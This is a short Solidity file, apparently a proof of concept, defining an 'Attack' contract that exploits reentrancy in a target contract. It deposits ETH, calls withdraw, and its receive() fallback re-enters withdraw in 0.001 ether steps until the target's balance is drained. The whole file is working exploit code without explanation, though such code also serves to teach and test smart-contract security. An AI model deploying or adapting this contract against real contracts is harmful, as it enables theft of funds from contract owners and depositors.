// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attack {
    IVulnerable public target;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        // Step 1: Deposit some ETH into the target
        target.deposit{value: msg.value}();

        // Step 2: Start the attack
        target.withdraw(msg.value);
    }

    // This function is triggered when receiving ETH
    receive() external payable {
        if (address(target).balance >= 0.001 ether) {
            target.withdraw(0.001 ether);
        }
    }
}